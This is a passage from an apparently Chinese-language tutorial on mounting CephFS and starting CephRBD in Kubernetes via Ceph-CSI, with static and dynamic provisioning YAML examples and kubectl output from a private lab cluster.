之前创建的密钥所在的命名空间。必需参数。</li></ul></li><li><code>volumeAttributes</code> : 卷相关属性。<ul><li><code>fsName</code> : 待挂载的 CephFS 文件系统名称。不传递此选项将挂载默认文件系统。可选参数。</li><li><code>clusterID</code> : Ceph 集群 ID 。必需参数。</li><li><code>staticVolume</code> : 必须将值设置为 true 才能挂载和卸载静态 CephFS PVC 。必需参数。</li><li><code>rootPath</code> : Ceph 集群中子卷的实际路径，或者卷的文件夹路径。必需参数。</li></ul></li><li><code>volumeHandle</code> : 可以是任何内容，不需要与 PV 名称或卷名称相同。为了简洁起见保持相同。</li><li><code>persistentVolumeReclaimPolicy</code> : Ceph-CSI 不支持删除静态 PV 的 CephFS 子卷。所以该参数必须设置为 Retain ，以避免在 csi-provisioner 中尝试删除 PV 。</li></ul><p><strong>相关操作记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 ceph-csi]$ kubectl create -f ./examples/cephfs/static-pv.yaml<br>persistentvolume/cephfs-static-pv created<br><br>[bugwz@node03 ceph-csi]$ kubectl get all,pv -n default<br>NAME                                                READY   STATUS    RESTARTS   AGE<br>pod/csi-cephfsplugin-68knr                          3/3     Running   0          63m<br>pod/csi-cephfsplugin-provisioner-7968db74cb-2xn6p   5/5     Running   0          63m<br>pod/csi-cephfsplugin-provisioner-7968db74cb-5d4kn   0/5     Pending   0          63m<br>pod/csi-cephfsplugin-provisioner-7968db74cb-5dhlm   0/5     Pending   0          63m<br><br>NAME                                   TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)    AGE<br>service/csi-cephfsplugin-provisioner   ClusterIP   10.101.130.172   &lt;none&gt;        8080/TCP   63m<br>service/csi-metrics-cephfsplugin       ClusterIP   10.106.150.166   &lt;none&gt;        8080/TCP   63m<br>service/kubernetes                     ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP    72m<br><br>NAME                              DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR   AGE<br>daemonset.apps/csi-cephfsplugin   1         1         1       1            1           &lt;none&gt;          63m<br><br>NAME                                           READY   UP-TO-DATE   AVAILABLE   AGE<br>deployment.apps/csi-cephfsplugin-provisioner   1/3     3            1           63m<br><br>NAME                                                      DESIRED   CURRENT   READY   AGE<br>replicaset.apps/csi-cephfsplugin-provisioner-7968db74cb   3         3         1       63m<br><br>NAME                                CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS      CLAIM   STORAGECLASS   VOLUMEATTRIBUTESCLASS   REASON   AGE<br>persistentvolume/cephfs-static-pv   1Gi        RWX            Retain           Available                          &lt;<span class="hljs-built_in">unset</span>&gt;                          3m39s<br></code></pre></td></tr></table></figure><h3 id="5-2-3、创建PVC"><a href="#5-2-3、创建PVC" class="headerlink" title="5.2.3、创建PVC"></a>5.2.3、创建PVC</h3><p><strong>相关命令:</strong> (位于 10.10.0.3 节点上执行)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建 static-pvc.yaml</span><br>vi ./examples/cephfs/static-pvc.yaml<br><br><span class="hljs-comment"># 创建 pvc</span><br>kubectl create -f ./examples/cephfs/static-pvc.yaml<br><br><span class="hljs-comment"># 查看状态</span><br>kubectl get all,pv,pvc -n default<br></code></pre></td></tr></table></figure><p><strong>static-pvc.yaml 示例文件:</strong> (参考资料 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/docs/static-pvc.md#create-cephfs-static-pvc">create-cephfs-static-pvc</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">PersistentVolumeClaim</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">cephfs-static-pvc</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">default</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">accessModes:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">ReadWriteMany</span><br>  <span class="hljs-attr">resources:</span><br>    <span class="hljs-attr">requests:</span><br>      <span class="hljs-attr">storage:</span> <span class="hljs-string">1Gi</span><br>  <span class="hljs-attr">storageClassName:</span> <span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-attr">volumeMode:</span> <span class="hljs-string">Filesystem</span><br>  <span class="hljs-attr">volumeName:</span> <span class="hljs-string">cephfs-static-pv</span><br></code></pre></td></tr></table></figure><p><strong>相关操作记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 ceph-csi]$ kubectl create -f ./examples/cephfs/static-pvc.yaml<br>persistentvolumeclaim/cephfs-static-pvc created<br><br>[bugwz@node03 ceph-csi]$ kubectl get all,pv,pvc -n default<br>NAME                                                READY   STATUS    RESTARTS   AGE<br>pod/csi-cephfsplugin-68knr                          3/3     Running   0          66m<br>pod/csi-cephfsplugin-provisioner-7968db74cb-2xn6p   5/5     Running   0          66m<br>pod/csi-cephfsplugin-provisioner-7968db74cb-5d4kn   0/5     Pending   0          66m<br>pod/csi-cephfsplugin-provisioner-7968db74cb-5dhlm   0/5     Pending   0          66m<br><br>NAME                                   TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)    AGE<br>service/csi-cephfsplugin-provisioner   ClusterIP   10.101.130.172   &lt;none&gt;        8080/TCP   66m<br>service/csi-metrics-cephfsplugin       ClusterIP   10.106.150.166   &lt;none&gt;        8080/TCP   66m<br>service/kubernetes                     ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP    75m<br><br>NAME                              DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR   AGE<br>daemonset.apps/csi-cephfsplugin   1         1         1       1            1           &lt;none&gt;          66m<br><br>NAME                                           READY   UP-TO-DATE   AVAILABLE   AGE<br>deployment.apps/csi-cephfsplugin-provisioner   1/3     3            1           66m<br><br>NAME                                                      DESIRED   CURRENT   READY   AGE<br>replicaset.apps/csi-cephfsplugin-provisioner-7968db74cb   3         3         1       66m<br><br>NAME                                CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                       STORAGECLASS   VOLUMEATTRIBUTESCLASS   REASON   AGE<br>persistentvolume/cephfs-static-pv   1Gi        RWX            Retain           Bound    default/cephfs-static-pvc                  &lt;<span class="hljs-built_in">unset</span>&gt;                          6m53s<br><br>NAME                                      STATUS   VOLUME             CAPACITY   ACCESS MODES   STORAGECLASS   VOLUMEATTRIBUTESCLASS   AGE<br>persistentvolumeclaim/cephfs-static-pvc   Bound    cephfs-static-pv   1Gi        RWX                           &lt;<span class="hljs-built_in">unset</span>&gt;                 26s<br></code></pre></td></tr></table></figure><h3 id="5-2-4、创建Pod"><a href="#5-2-4、创建Pod" class="headerlink" title="5.2.4、创建Pod"></a>5.2.4、创建Pod</h3><p><strong>相关命令:</strong> (位于 10.10.0.3 节点上执行)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建 static-pod.yaml</span><br>vi ./examples/cephfs/static-pod.yaml<br><br><span class="hljs-comment"># 创建 pod</span><br>kubectl create -f ./examples/cephfs/static-pod.yaml<br><br><span class="hljs-comment"># 查看状态</span><br>kubectl get all,pv,pvc,pod -n default<br><br><span class="hljs-comment"># 验证 pvc 是否已经成功挂载</span><br>kubectl <span class="hljs-built_in">exec</span> cephfs-static-pod -- <span class="hljs-built_in">df</span> -h /data/pvc<br><br><span class="hljs-comment"># 查看 ceph 对应的目录数据</span><br>tree /mnt/cephfs<br></code></pre></td></tr></table></figure><p><strong>static-pod.yaml 示例文件:</strong> (参考资料 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/docs/static-pvc.md#verify-cephfs-static-pvc">verify-cephfs-static-pvc</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">cephfs-static-pod</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">default</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">busybox</span><br>      <span class="hljs-attr">image:</span> <span class="hljs-string">busybox:latest</span><br>      <span class="hljs-attr">volumeMounts:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">static-pvc</span><br>          <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/data/pvc</span><br>      <span class="hljs-attr">command:</span> [<span class="hljs-string">&quot;sleep&quot;</span>, <span class="hljs-string">&quot;3600&quot;</span>]<br>  <span class="hljs-attr">volumes:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">static-pvc</span><br>      <span class="hljs-attr">persistentVolumeClaim:</span><br>        <span class="hljs-attr">claimName:</span> <span class="hljs-string">cephfs-static-pvc</span><br>        <span class="hljs-attr">readOnly:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p><strong>相关操作记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 ceph-csi]$ kubectl create -f ./examples/cephfs/static-pod.yaml<br>pod/cephfs-static-pod created<br><br><br>[bugwz@node03 ceph-csi]$ kubectl get all,pv,pvc -n default<br>NAME                                                READY   STATUS    RESTARTS   AGE<br>pod/cephfs-static-pod                               1/1     Running   0          38s<br>pod/csi-cephfsplugin-68knr                          3/3     Running   0          68m<br>pod/csi-cephfsplugin-provisioner-7968db74cb-2xn6p   5/5     Running   0          68m<br>pod/csi-cephfsplugin-provisioner-7968db74cb-5d4kn   0/5     Pending   0          68m<br>pod/csi-cephfsplugin-provisioner-7968db74cb-5dhlm   0/5     Pending   0          68m<br><br>NAME                                   TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)    AGE<br>service/csi-cephfsplugin-provisioner   ClusterIP   10.101.130.172   &lt;none&gt;        8080/TCP   68m<br>service/csi-metrics-cephfsplugin       ClusterIP   10.106.150.166   &lt;none&gt;        8080/TCP   68m<br>service/kubernetes                     ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP    77m<br><br>NAME                              DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR   AGE<br>daemonset.apps/csi-cephfsplugin   1         1         1       1            1           &lt;none&gt;          68m<br><br>NAME                                           READY   UP-TO-DATE   AVAILABLE   AGE<br>deployment.apps/csi-cephfsplugin-provisioner   1/3     3            1           68m<br><br>NAME                                                      DESIRED   CURRENT   READY   AGE<br>replicaset.apps/csi-cephfsplugin-provisioner-7968db74cb   3         3         1       68m<br><br>NAME                                CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                       STORAGECLASS   VOLUMEATTRIBUTESCLASS   REASON   AGE<br>persistentvolume/cephfs-static-pv   1Gi        RWX            Retain           Bound    default/cephfs-static-pvc                  &lt;<span class="hljs-built_in">unset</span>&gt;                          9m3s<br><br>NAME                                      STATUS   VOLUME             CAPACITY   ACCESS MODES   STORAGECLASS   VOLUMEATTRIBUTESCLASS   AGE<br>persistentvolumeclaim/cephfs-static-pvc   Bound    cephfs-static-pv   1Gi        RWX                           &lt;<span class="hljs-built_in">unset</span>&gt;                 2m36s<br><br><br>[bugwz@node03 ceph-csi]$ kubectl <span class="hljs-built_in">exec</span> cephfs-static-pod -- <span class="hljs-built_in">df</span> -h /data/pvc<br>Filesystem                Size      Used Available Use% Mounted on<br>10.10.0.1:6789,10.10.0.2:6789,10.10.0.3:6789:/volumes/cephfsgroup/csisubvolume<br>                        189.9G         0    189.9G   0% /data/pvc<br><br><br>[bugwz@node03 ceph-csi]$ tree /mnt/cephfs<br>/mnt/cephfs<br>└── volumes<br>    ├── cephfsgroup<br>    │   └── csisubvolume<br>    │       └── 7f646a62-f63d-42b7-8b15-7af9c8072788<br>    └── _cephfsgroup:csisubvolume.meta<br><br>4 directories, 1 file<br></code></pre></td></tr></table></figure><h2 id="5-3、动态配置"><a href="#5-3、动态配置" class="headerlink" title="5.3、动态配置"></a>5.3、动态配置</h2><h3 id="5-3-1、创建子卷组"><a href="#5-3-1、创建子卷组" class="headerlink" title="5.3.1、创建子卷组"></a>5.3.1、创建子卷组</h3><blockquote><p><strong>注意:</strong> 动态配置的时候，我们需要一个名为 csi 的子卷组，用于后续自动化的创建子卷。</p></blockquote><p><strong>相关命令:</strong> (位于 10.10.0.1 节点上执行)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建子卷组</span><br><span class="hljs-comment"># cephfs 文件系统名称，将在其中创建对应的子卷组</span><br><span class="hljs-comment"># csi 创建的子卷组名称</span><br>ceph fs subvolumegroup create cephfs csi<br><br><span class="hljs-comment"># 查看文件系统中的子卷组信息</span><br>ceph fs subvolumegroup <span class="hljs-built_in">ls</span> cephfs<br><br><span class="hljs-comment"># 查看文件系统中特定子卷组中的子卷信息</span><br>ceph fs subvolume <span class="hljs-built_in">ls</span> cephfs csi<br></code></pre></td></tr></table></figure><h3 id="5-3-2、创建StorageClass"><a href="#5-3-2、创建StorageClass" class="headerlink" title="5.3.2、创建StorageClass"></a>5.3.2、创建StorageClass</h3><p><strong>相关命令:</strong> (位于 10.10.0.3 节点上执行)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 编辑 ./examples/cephfs/storageclass.yaml</span><br>vi ./examples/cephfs/storageclass.yaml<br><br><span class="hljs-comment"># 应用 ./examples/cephfs/storageclass.yaml</span><br>kubectl apply -f ./examples/cephfs/storageclass.yaml<br><br><span class="hljs-comment"># 查看状态</span><br>kubectl get all,storageclass -n default<br></code></pre></td></tr></table></figure><p><strong>storageclass.yaml 文件示例:</strong> (参考文件 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/examples/cephfs/storageclass.yaml">.&#x2F;examples&#x2F;cephfs&#x2F;storageclass.yaml</a>)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">---<br>apiVersion: storage.k8s.io/v1<br>kind: StorageClass<br>metadata:<br>  name: csi-cephfs-sc<br>provisioner: cephfs.csi.ceph.com<br>parameters:<br>  clusterID: 13db9fce-5c90-11f0-8c5e-005056854af3<br>  fsName: cephfs<br>  <span class="hljs-comment"># pool: &lt;cephfs-data-pool&gt;</span><br>  <span class="hljs-comment"># fuseMountOptions: debug</span><br>  <span class="hljs-comment"># kernelMountOptions: readdir_max_bytes=1048576,norbytes</span><br>  csi.storage.k8s.io/provisioner-secret-name: csi-cephfs-secret<br>  csi.storage.k8s.io/provisioner-secret-namespace: default<br>  csi.storage.k8s.io/controller-expand-secret-name: csi-cephfs-secret<br>  csi.storage.k8s.io/controller-expand-secret-namespace: default<br>  csi.storage.k8s.io/node-stage-secret-name: csi-cephfs-secret<br>  csi.storage.k8s.io/node-stage-secret-namespace: default<br>  <span class="hljs-comment"># mounter: kernel</span><br>  <span class="hljs-comment"># volumeNamePrefix: &quot;foo-bar-&quot;</span><br>  <span class="hljs-comment"># backingSnapshot: &quot;true&quot;</span><br>  <span class="hljs-comment"># encrypted: &quot;false&quot;</span><br>  <span class="hljs-comment"># encryptionKMSID: &lt;kms-config-id&gt;</span><br>reclaimPolicy: Delete<br>allowVolumeExpansion: <span class="hljs-literal">true</span><br><span class="hljs-comment"># mountOptions:</span><br><span class="hljs-comment">#   - context=&quot;system_u:object_r:container_file_t:s0:c0,c1&quot;</span><br></code></pre></td></tr></table></figure><p><strong>配置解析:</strong></p><ul><li><code>clusterID</code> : Ceph 集群 ID 。确保与 csi-config-map.yaml 中的集群 ID 保持一致。必需参数。</li><li><code>fsName</code> : CephFS 文件系统名称，将会在其中创建卷。必需参数。</li><li><code>pool</code> : Ceph 池名称，将会在其中存储卷数据。可选参数。</li><li><code>fuseMountOptions</code> : Ceph-Fuse 挂载选项字符串，使用逗号分隔。可选参数。</li><li><code>kernelMountOptions</code> : Cephfs 内核挂载选项字符串，使用逗号分隔。可选参数。</li><li><code>mounter</code> : 挂载方式，可选值为 kernel&#x2F;fuse 。默认将自动检测使用命令确定。可选参数。</li><li><code>volumeNamePrefix</code> : 子卷命名前缀。默认为 csi-vol- 。可选参数。</li><li><code>backingSnapshot</code> : 启用时 PVC 将由其数据源中指定的 CephFS 快照支持，这时不应配置 <code>pool</code> 参数。默认为 true 。可选参数。</li><li><code>encrypted</code> : 是否加密卷。默认为 false 。可选参数。</li><li><code>encryptionKMSID</code> : 通过指定与 KMS ConfigMap 匹配的唯一 ID 来使用外部密钥管理系统进行加密密码。可选参数。</li></ul><p><strong>相关操作记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 ceph-csi]$ kubectl apply -f ./examples/cephfs/storageclass.yaml<br>storageclass.storage.k8s.io/csi-cephfs-sc created<br><br><br>[bugwz@node03 ceph-csi]$ kubectl get all,storageclass -n default<br>NAME                                                READY   STATUS    RESTARTS   AGE<br>pod/cephfs-static-pod                               1/1     Running   0          7m59s<br>pod/csi-cephfsplugin-68knr                          3/3     Running   0          76m<br>pod/csi-cephfsplugin-provisioner-7968db74cb-2xn6p   5/5     Running   0          76m<br>pod/csi-cephfsplugin-provisioner-7968db74cb-5d4kn   0/5     Pending   0          76m<br>pod/csi-cephfsplugin-provisioner-7968db74cb-5dhlm   0/5     Pending   0          76m<br><br>NAME                                   TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)    AGE<br>service/csi-cephfsplugin-provisioner   ClusterIP   10.101.130.172   &lt;none&gt;        8080/TCP   76m<br>service/csi-metrics-cephfsplugin       ClusterIP   10.106.150.166   &lt;none&gt;        8080/TCP   76m<br>service/kubernetes                     ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP    85m<br><br>NAME                              DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR   AGE<br>daemonset.apps/csi-cephfsplugin   1         1         1       1            1           &lt;none&gt;          76m<br><br>NAME                                           READY   UP-TO-DATE   AVAILABLE   AGE<br>deployment.apps/csi-cephfsplugin-provisioner   1/3     3            1           76m<br><br>NAME                                                      DESIRED   CURRENT   READY   AGE<br>replicaset.apps/csi-cephfsplugin-provisioner-7968db74cb   3         3         1       76m<br><br>NAME                                             PROVISIONER                RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE<br>storageclass.storage.k8s.io/csi-cephfs-sc        cephfs.csi.ceph.com        Delete          Immediate           <span class="hljs-literal">true</span>                   24s<br>storageclass.storage.k8s.io/standard (default)   k8s.io/minikube-hostpath   Delete          Immediate           <span class="hljs-literal">false</span>                  85m<br></code></pre></td></tr></table></figure><h3 id="5-3-3、创建PVC"><a href="#5-3-3、创建PVC" class="headerlink" title="5.3.3、创建PVC"></a>5.3.3、创建PVC</h3><p><strong>相关命令:</strong> (位于 10.10.0.3 节点上执行)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 修改 ./examples/cephfs/pvc.yaml</span><br>vi ./examples/cephfs/pvc.yaml<br><br><span class="hljs-comment"># 应用 ./examples/cephfs/pvc.yaml</span><br>kubectl apply -f ./examples/cephfs/pvc.yaml<br><br><span class="hljs-comment"># 查看状态</span><br>kubectl get all,storageclass,pvc -n default<br></code></pre></td></tr></table></figure><p><strong>pvc.yaml 文件示例:</strong> (参考文件 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/examples/cephfs/pvc.yaml">.&#x2F;examples&#x2F;cephfs&#x2F;pvc.yaml</a>)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">---<br>apiVersion: v1<br>kind: PersistentVolumeClaim<br>metadata:<br>  name: csi-cephfs-pvc<br>spec:<br>  accessModes:<br>    - ReadWriteMany<br>  resources:<br>    requests:<br>      storage: 1Gi<br>  storageClassName: csi-cephfs-sc<br></code></pre></td></tr></table></figure><p><strong>相关操作记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 ceph-csi]$ kubectl apply -f ./examples/cephfs/pvc.yaml<br>persistentvolumeclaim/csi-cephfs-pvc created<br><br><br>[bugwz@node03 ceph-csi]$ kubectl get all,storageclass,pvc -n default<br>NAME                                                READY   STATUS    RESTARTS      AGE<br>pod/cephfs-static-pod                               1/1     Running   1 (25m ago)   85m<br>pod/csi-cephfsplugin-68knr                          3/3     Running   0             153m<br>pod/csi-cephfsplugin-provisioner-7968db74cb-2xn6p   5/5     Running   0             153m<br>pod/csi-cephfsplugin-provisioner-7968db74cb-5d4kn   0/5     Pending   0             153m<br>pod/csi-cephfsplugin-provisioner-7968db74cb-5dhlm   0/5     Pending   0             153m<br><br>NAME                                   TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)    AGE<br>service/csi-cephfsplugin-provisioner   ClusterIP   10.101.130.172   &lt;none&gt;        8080/TCP   153m<br>service/csi-metrics-cephfsplugin       ClusterIP   10.106.150.166   &lt;none&gt;        8080/TCP   153m<br>service/kubernetes                     ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP    162m<br><br>NAME                              DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR   AGE<br>daemonset.apps/csi-cephfsplugin   1         1         1       1            1           &lt;none&gt;          153m<br><br>NAME                                           READY   UP-TO-DATE   AVAILABLE   AGE<br>deployment.apps/csi-cephfsplugin-provisioner   1/3     3            1           153m<br><br>NAME                                                      DESIRED   CURRENT   READY   AGE<br>replicaset.apps/csi-cephfsplugin-provisioner-7968db74cb   3         3         1       153m<br><br>NAME                                             PROVISIONER                RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE<br>storageclass.storage.k8s.io/csi-cephfs-sc        cephfs.csi.ceph.com        Delete          Immediate           <span class="hljs-literal">true</span>                   77m<br>storageclass.storage.k8s.io/standard (default)   k8s.io/minikube-hostpath   Delete          Immediate           <span class="hljs-literal">false</span>                  162m<br><br>NAME                                      STATUS   VOLUME                                     CAPACITY   ACCESS MODES   STORAGECLASS    VOLUMEATTRIBUTESCLASS   AGE<br>persistentvolumeclaim/cephfs-static-pvc   Bound    cephfs-static-pv                           1Gi        RWX                            &lt;<span class="hljs-built_in">unset</span>&gt;                 87m<br>persistentvolumeclaim/csi-cephfs-pvc      Bound    pvc-99d82063-6768-421b-90cb-e0227de6a9b6   1Gi        RWX            csi-cephfs-sc   &lt;<span class="hljs-built_in">unset</span>&gt;                 74m<br></code></pre></td></tr></table></figure><h3 id="5-3-4、创建Pod"><a href="#5-3-4、创建Pod" class="headerlink" title="5.3.4、创建Pod"></a>5.3.4、创建Pod</h3><p><strong>相关命令:</strong> (位于 10.10.0.3 节点上执行)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 修改 ./examples/cephfs/pod.yaml</span><br>vi ./examples/cephfs/pod.yaml<br><br><span class="hljs-comment"># 应用 ./examples/cephfs/pod.yaml</span><br>kubectl apply -f ./examples/cephfs/pod.yaml<br><br><span class="hljs-comment"># 查看状态</span><br>kubectl get all,storageclass,pvc,pod -n default<br><br><span class="hljs-comment"># 验证 pvc 是否已经成功挂载</span><br>kubectl <span class="hljs-built_in">exec</span> csi-cephfs-pod -- <span class="hljs-built_in">df</span> -h /var/lib/www<br><br><span class="hljs-comment"># 查看 ceph 对应的目录数据</span><br>tree /mnt/cephfs/volumes/csi<br></code></pre></td></tr></table></figure><p><strong>pod.yaml 文件示例:</strong> (参考文件 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/examples/cephfs/pod.yaml">.&#x2F;examples&#x2F;cephfs&#x2F;pod.yaml</a>)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">---<br>apiVersion: v1<br>kind: Pod<br>metadata:<br>  name: csi-cephfs-pod<br>spec:<br>  containers:<br>    - name: web-server<br>      image: docker.io/library/nginx:latest<br>      volumeMounts:<br>        - name: mypvc<br>          mountPath: /var/lib/www<br>  volumes:<br>    - name: mypvc<br>      persistentVolumeClaim:<br>        claimName: csi-cephfs-pvc<br>        readOnly: <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p><strong>相关操作记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 ceph-csi]$ kubectl apply -f ./examples/cephfs/pod.yaml<br>pod/csi-cephfs-pod created<br><br><br>[bugwz@node03 ceph-csi]$ kubectl get all,storageclass,pvc,pod -n default<br>NAME                                                READY   STATUS    RESTARTS      AGE<br>pod/cephfs-static-pod                               1/1     Running   1 (26m ago)   86m<br>pod/csi-cephfs-pod                                  1/1     Running   0             74m<br>pod/csi-cephfsplugin-68knr                          3/3     Running   0             154m<br>pod/csi-cephfsplugin-provisioner-7968db74cb-2xn6p   5/5     Running   0             154m<br>pod/csi-cephfsplugin-provisioner-7968db74cb-5d4kn   0/5     Pending   0             154m<br>pod/csi-cephfsplugin-provisioner-7968db74cb-5dhlm   0/5     Pending   0             154m<br><br>NAME                                   TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)    AGE<br>service/csi-cephfsplugin-provisioner   ClusterIP   10.101.130.172   &lt;none&gt;        8080/TCP   154m<br>service/csi-metrics-cephfsplugin       ClusterIP   10.106.150.166   &lt;none&gt;        8080/TCP   154m<br>service/kubernetes                     ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP    163m<br><br>NAME                              DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR   AGE<br>daemonset.apps/csi-cephfsplugin   1         1         1       1            1           &lt;none&gt;          154m<br><br>NAME                                           READY   UP-TO-DATE   AVAILABLE   AGE<br>deployment.apps/csi-cephfsplugin-provisioner   1/3     3            1           154m<br><br>NAME                                                      DESIRED   CURRENT   READY   AGE<br>replicaset.apps/csi-cephfsplugin-provisioner-7968db74cb   3         3         1       154m<br><br>NAME                                             PROVISIONER                RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE<br>storageclass.storage.k8s.io/csi-cephfs-sc        cephfs.csi.ceph.com        Delete          Immediate           <span class="hljs-literal">true</span>                   78m<br>storageclass.storage.k8s.io/standard (default)   k8s.io/minikube-hostpath   Delete          Immediate           <span class="hljs-literal">false</span>                  163m<br><br>NAME                                      STATUS   VOLUME                                     CAPACITY   ACCESS MODES   STORAGECLASS    VOLUMEATTRIBUTESCLASS   AGE<br>persistentvolumeclaim/cephfs-static-pvc   Bound    cephfs-static-pv                           1Gi        RWX                            &lt;<span class="hljs-built_in">unset</span>&gt;                 88m<br>persistentvolumeclaim/csi-cephfs-pvc      Bound    pvc-99d82063-6768-421b-90cb-e0227de6a9b6   1Gi        RWX            csi-cephfs-sc   &lt;<span class="hljs-built_in">unset</span>&gt;                 76m<br><br><br>[bugwz@node03 ceph-csi]$ kubectl <span class="hljs-built_in">exec</span> csi-cephfs-pod -- <span class="hljs-built_in">df</span> -h /var/lib/www<br>Filesystem                                                                                                                                         Size  Used Avail Use% Mounted on<br>10.10.0.1:6789,10.10.0.2:6789,10.10.0.3:6789:/volumes/csi/csi-vol-0ebde315-c3d8-4410-a5b8-f75fe3d9951c/5bce7da0-3010-478c-9dc6-1321c1ed9b58  1.0G     0  1.0G   0% /var/lib/www<br><br><br>[bugwz@node03 ceph-csi]$ tree /mnt/cephfs/volumes/csi<br>/mnt/cephfs/volumes/csi<br>└── csi-vol-0ebde315-c3d8-4410-a5b8-f75fe3d9951c<br>    └── 5bce7da0-3010-478c-9dc6-1321c1ed9b58<br><br>2 directories, 0 files<br></code></pre></td></tr></table></figure><h1 id="六、CephRBD-对接-CSI"><a href="#六、CephRBD-对接-CSI" class="headerlink" title="六、CephRBD 对接 CSI"></a>六、CephRBD 对接 CSI</h1><h2 id="6-1、创建Secret"><a href="#6-1、创建Secret" class="headerlink" title="6.1、创建Secret"></a>6.1、创建Secret</h2><p>无论是使用静态配置还是动态配置，都需要创建 Secret ，因此这里统一设置。</p><p><strong>相关命令:</strong> (位于 10.10.0.3 节点上执行)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 编辑 ./examples/rbd/secret.yaml</span><br>vi ./examples/rbd/secret.yaml<br><br><span class="hljs-comment"># 应用 ./examples/rbd/secret.yaml</span><br>kubectl apply -f ./examples/rbd/secret.yaml<br><br><span class="hljs-comment"># 查看状态</span><br>kubectl get all,secret -n default<br></code></pre></td></tr></table></figure><p><strong>secret.yaml 文件示例:</strong> (参考文件 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/examples/rbd/secret.yaml">.&#x2F;examples&#x2F;rbd&#x2F;secret.yaml</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Secret</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">csi-rbd-secret</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">default</span><br><span class="hljs-attr">stringData:</span><br>  <span class="hljs-attr">userID:</span> <span class="hljs-string">csirbduser</span><br>  <span class="hljs-attr">userKey:</span> <span class="hljs-string">AQBqF25oTG9cDxAAc3hGO09OCT0+J1cyUFoh6Q==</span><br>  <span 